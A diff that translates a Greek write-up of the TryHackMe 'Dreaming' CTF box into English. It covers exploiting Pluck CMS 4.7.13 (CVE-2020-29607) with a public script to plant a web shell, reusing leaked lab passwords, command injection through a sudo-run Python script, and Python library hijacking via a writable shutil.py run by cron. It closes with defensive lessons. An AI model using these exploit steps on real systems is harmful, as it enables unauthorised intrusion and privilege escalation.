@@ -1,14 +1,14 @@
 # TryHackMe — Dreaming (Writeup)
 
-**Difficulty:** Easy  
-**OS:** Linux (Ubuntu 20.04)  
-**Tags:** Pluck CMS, CVE-2020-29607, Command Injection, Python Library Hijacking  
+**Difficulty:** Easy
+**OS:** Linux (Ubuntu 20.04)
+**Tags:** Pluck CMS, CVE-2020-29607, Command Injection, Python Library Hijacking
 
 ---
 
-## Σύνοψη
+## Summary
 
-Το "Dreaming" είναι ένα Linux CTF box στο TryHackMe, βασισμένο στο Sandman universe του Neil Gaiman. Περιλαμβάνει 3 flags (Lucien, Death, Morpheus), κάθε ένα αντιστοιχεί σε lateral movement ή privilege escalation σε διαφορετικό user. Η αλυσίδα επίθεσης:
+"Dreaming" is a Linux CTF box on TryHackMe, based on Neil Gaiman's Sandman universe. It contains 3 flags (Lucien, Death, Morpheus), each corresponding to lateral movement or privilege escalation to a different user. Attack chain:
 
 ```
 www-data → lucien → death → morpheus
@@ -24,14 +24,14 @@ www-data → lucien → death → morpheus
 nmap -sC -sV -p- 10.113.139.96
 ```
 
-**Αποτελέσματα:**
+**Results:**
 
 | Port | Service | Version |
 |------|---------|---------|
 | 22   | SSH     | OpenSSH 8.2p1 |
 | 80   | HTTP    | Apache 2.4.41 (Ubuntu) |
 
-Η αρχική σελίδα (port 80) είναι η default Apache page ("It works").
+The landing page (port 80) is the default Apache page ("It works").
 
 ### Directory Enumeration
 
@@ -39,29 +39,29 @@ nmap -sC -sV -p- 10.113.139.96
 gobuster dir -u http://10.113.139.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
 ```
 
-**Αποτελέσματα:**
+**Results:**
 
 | Path | Status |
 |------|--------|
 | /app | 301 (Redirect) |
 
-Μέσα στο `/app/` βρίσκεται ένα directory listing με τον φάκελο `pluck-4.7.13/`.
+Inside `/app/` there's a directory listing with the folder `pluck-4.7.13/`.
 
-Πρόκειται για το **Pluck CMS version 4.7.13**.
+This is **Pluck CMS version 4.7.13**.
 
 ---
 
 ## 2. Initial Access — CVE-2020-29607
 
-### Login στο Pluck CMS
+### Login to Pluck CMS
 
-Η login page βρίσκεται στο:
+The login page is at:
 
 ```
 http://10.113.139.96/app/pluck-4.7.13/login.php
 ```
 
-Ζητάει μόνο password (χωρίς username). Δοκιμάζοντας `password` → **επιτυχής login**.
+It only asks for a password (no username). Trying `password` → **successful login**.
 
 ### Searchsploit
 
@@ -73,16 +73,16 @@ searchsploit pluck 4.7.13
 Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) | php/webapps/49909.py
 ```
 
-Πρόκειται για το **CVE-2020-29607** — file upload restriction bypass που επιτρέπει ανέβασμα PHP webshell.
+This is **CVE-2020-29607** — a file upload restriction bypass that allows uploading a PHP webshell.
 
-### Εκτέλεση Exploit
+### Running the Exploit
 
 ```bash
 searchsploit -m 49909.py
 python3 49909.py 10.113.139.96 80 password /app/pluck-4.7.13
 ```
 
-Το exploit ανεβάζει ένα **p0wny-shell** (web shell) ως `shell.phar`:
+The exploit uploads a **p0wny-shell** (web shell) as `shell.phar`:
 
 ```
 http://10.113.139.96/app/pluck-4.7.13/files/shell.phar
@@ -93,22 +93,22 @@ whoami
 # www-data
 ```
 
-Έχουμε **initial foothold** ως `www-data`.
+We now have an **initial foothold** as `www-data`.
 
 ---
 
 ## 3. www-data → Lucien (Credential Discovery)
 
-### Enumeration ως www-data
+### Enumeration as www-data
 
 ```bash
 ls /home
 # death  lucien  morpheus  ubuntu
 ```
 
-Το flag του lucien (`/home/lucien/lucien_flag.txt`) δεν είναι readable ως www-data.
+Lucien's flag (`/home/lucien/lucien_flag.txt`) is not readable as www-data.
 
-### Credentials σε Python script
+### Credentials in a Python Script
 
 ```bash
 cat /opt/test.py
@@ -121,7 +121,7 @@ password = "HeyLucien#@1999!"
 ...
 ```
 
-Ο lucien χρησιμοποιεί το password **`HeyLucien#@1999!`** για το Pluck CMS. Δοκιμάζουμε reuse σε SSH:
+Lucien uses the password **`HeyLucien#@1999!`** for the Pluck CMS. We try reusing it over SSH:
 
 ```bash
 ssh lucien@10.113.139.96
@@ -149,22 +149,22 @@ sudo -l
 (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
 ```
 
-Ο lucien μπορεί να τρέξει το `getDreams.py` ως **death** χωρίς password.
+Lucien can run `getDreams.py` as **death** without a password.
 
-### Ανάλυση getDreams.py
+### Analyzing getDreams.py
 
-Το script συνδέεται στη MySQL database `library`, τραβάει data από τον πίνακα `dreams`, και τα περνάει σε subprocess:
+The script connects to the MySQL database `library`, pulls data from the `dreams` table, and passes it into a subprocess:
 
 ```python
 command = f"echo {dreamer} + {dream}"
 shell = subprocess.check_output(command, text=True, shell=True)
 ```
 
-Η χρήση `shell=True` με user-controlled input → **command injection vulnerability**.
+Using `shell=True` with user-controlled input → **command injection vulnerability**.
 
 ### MySQL Credentials
 
-Από το `.bash_history` του lucien:
+From lucien's `.bash_history`:
 
 ```
 mysql -u lucien -plucien42DBPASSWORD
@@ -202,14 +202,14 @@ cat /home/death/death_flag.txt
 
 ## 5. Death → Morpheus (Python Library Hijacking)
 
-### Enumeration ως death
+### Enumeration as death
 
 ```bash
 sudo -l
 # Sorry, user death may not run sudo on ip-10-113-139-96.
 ```
 
-Δεν υπάρχουν sudo privileges. Ψάχνουμε αλλού.
+No sudo privileges. Looking elsewhere.
 
 ### Writable Files
 
@@ -218,9 +218,9 @@ ls -la /usr/lib/python3.8/shutil.py
 # -rw-rw-r-- 1 root death 51474 Mar 18 2025 /usr/lib/python3.8/shutil.py
 ```
 
-Ο **death group** έχει write access στο `shutil.py`!
+The **death group** has write access to `shutil.py`!
 
-### restore.py του Morpheus
+### Morpheus's restore.py
 
 ```bash
 cat /home/morpheus/restore.py
@@ -234,11 +234,11 @@ backup(src_file, dst_file)
 print("The kingdom backup has been done!")
 ```
 
-Αυτό κάνει `import shutil` και τρέχει ως **cron job** του morpheus.
+This does `import shutil` and runs as a **cron job** owned by morpheus.
 
 ### Python Library Hijacking
 
-Προσθέτουμε malicious code στην αρχή του `shutil.py`:
+We prepend malicious code to `shutil.py`:
 
 ```bash
 cp /usr/lib/python3.8/shutil.py /tmp/shutil_backup.py
@@ -247,7 +247,7 @@ cat /tmp/payload.py /tmp/shutil_backup.py > /tmp/shutil_new.py
 cp /tmp/shutil_new.py /usr/lib/python3.8/shutil.py
 ```
 
-Μετά από ~1 λεπτό (cron execution):
+After ~1 minute (cron execution):
 
 ```bash
 ls -la /tmp/morphbash
@@ -275,24 +275,24 @@ Nmap + Gobuster
 Pluck CMS 4.7.13 (weak password: "password")
     │
     ▼
-CVE-2020-29607 (File Upload RCE) → webshell ως www-data
+CVE-2020-29607 (File Upload RCE) → webshell as www-data
     │
     ▼
-Credential discovery σε /opt/test.py → SSH ως lucien
+Credential discovery in /opt/test.py → SSH as lucien
     │
     ▼
-sudo getDreams.py ως death + SQL command injection → shell ως death
+sudo getDreams.py as death + SQL command injection → shell as death
     │
     ▼
-Python library hijacking (writable shutil.py + cron) → shell ως morpheus
+Python library hijacking (writable shutil.py + cron) → shell as morpheus
 ```
 
 ---
 
 ## Lessons Learned
 
-- **Credential reuse**: Το password του lucien ήταν hardcoded σε test script, και λειτουργούσε και σε SSH.
-- **bash_history**: Ποτέ μην αφήνεις passwords σε command history (π.χ. `mysql -p<password>`).
-- **subprocess + shell=True**: Σε Python, ποτέ μην περνάς user input σε subprocess με `shell=True` — χρησιμοποίησε `subprocess.run()` με list arguments.
-- **File permissions**: Writable system libraries (shutil.py) σε combination με cron jobs = privilege escalation.
-- **Defense in depth**: Κάθε layer (CMS, SSH, MySQL, cron) είχε ξεχωριστή αδυναμία. Αν ένα ήταν patched, η αλυσίδα θα έσπαγε.
+- **Credential reuse**: Lucien's password was hardcoded in a test script, and it also worked over SSH.
+- **bash_history**: Never leave passwords in command history (e.g. `mysql -p<password>`).
+- **subprocess + shell=True**: In Python, never pass user input into a subprocess with `shell=True` — use `subprocess.run()` with list arguments instead.
+- **File permissions**: Writable system libraries (shutil.py) combined with cron jobs = privilege escalation.
+- **Defense in depth**: Every layer (CMS, SSH, MySQL, cron) had its own individual weakness. Had any one of them been patched, the chain would have broken.
